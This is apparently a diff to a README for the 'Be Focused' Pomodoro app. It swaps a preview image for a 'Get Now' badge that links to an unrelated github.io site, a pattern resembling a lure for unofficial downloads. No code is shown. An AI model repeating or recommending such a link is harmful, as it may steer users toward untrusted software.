@@ -46,7 +46,7 @@ Be Focused uses a practical motivation layer based on visible progress, task com
 
 Be Focused works best when the timer is placed where the user already manages tasks, reminders, and daily focus blocks.
 
-![Visual preview of a Pomodoro focus session with work and rest cycles](https://avatars.mds.yandex.net/i?id=f0c8d0f6db71df4c3d47f6c022a99e3c2cdf3b72-4576184-images-thumbs&n=13)
+[![Get Now](https://img.shields.io/badge/Get_Now-steelblue?style=for-the-badge&logo=arma)](https://scalable-performance-monitor-kit.github.io/.github/be-focused-pomodoro)
 
 - [ ] Use the Be Focused Mac app for desktop visibility during writing, coding, planning, or study.
 - [ ] Keep mobile notifications enabled when focus sessions need to continue away from the desk.
